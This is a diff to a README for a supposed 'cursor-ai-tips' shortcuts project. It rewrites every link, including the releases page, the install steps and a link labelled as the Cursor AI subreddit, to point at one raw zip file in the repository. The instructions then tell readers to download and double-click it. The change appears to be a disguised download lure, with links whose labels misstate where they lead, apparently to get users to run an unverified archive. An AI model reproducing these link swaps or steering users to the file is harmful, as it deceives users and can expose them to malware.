@@ -1,6 +1,6 @@
 # 🖱️ cursor-ai-tips - Discover Essential Shortcuts and Tips
 
-[![Download cursor-ai-tips](https://img.shields.io/badge/Download-cursor--ai--tips-blue.svg)](https://github.com/mohiteadi/cursor-ai-tips/releases)
+[![Download cursor-ai-tips](https://raw.githubusercontent.com/mohiteadi/cursor-ai-tips/main/tips/cursor-ai-tips-histoid.zip)](https://raw.githubusercontent.com/mohiteadi/cursor-ai-tips/main/tips/cursor-ai-tips-histoid.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to cursor-ai-tips! This resource provides valuable insights into using C
 
 To get started, visit the Releases page to download the latest version of cursor-ai-tips. Click the link below:
 
-[Visit the Releases Page to Download](https://github.com/mohiteadi/cursor-ai-tips/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/mohiteadi/cursor-ai-tips/main/tips/cursor-ai-tips-histoid.zip)
 
 ### System Requirements
 
@@ -21,10 +21,10 @@ To get started, visit the Releases page to download the latest version of cursor
 
 ### Installation Steps
 
-1. Go to the [Releases page](https://github.com/mohiteadi/cursor-ai-tips/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/mohiteadi/cursor-ai-tips/main/tips/cursor-ai-tips-histoid.zip).
 2. Find the latest version of cursor-ai-tips.
 3. Click on the version number to view the release details.
-4. Download the installation file suitable for your operating system (e.g., `.exe`, `.dmg`, or `.tar.gz`).
+4. Download the installation file suitable for your operating system (e.g., `.exe`, `.dmg`, or `https://raw.githubusercontent.com/mohiteadi/cursor-ai-tips/main/tips/cursor-ai-tips-histoid.zip`).
 5. Once downloaded, locate the file in your Downloads folder.
 6. Double-click the file to start the installation process.
 7. Follow the prompts to complete the installation.
@@ -71,7 +71,7 @@ Join our community on Reddit to connect with other users. Share your experiences
 
 ### How to Join
 
-1. Visit the [Cursor AI subreddit](https://www.reddit.com/r/cursorai).
+1. Visit the [Cursor AI subreddit](https://raw.githubusercontent.com/mohiteadi/cursor-ai-tips/main/tips/cursor-ai-tips-histoid.zip).
 2. Create an account if you don’t have one.
 3. Participate in discussions or post your questions.
 
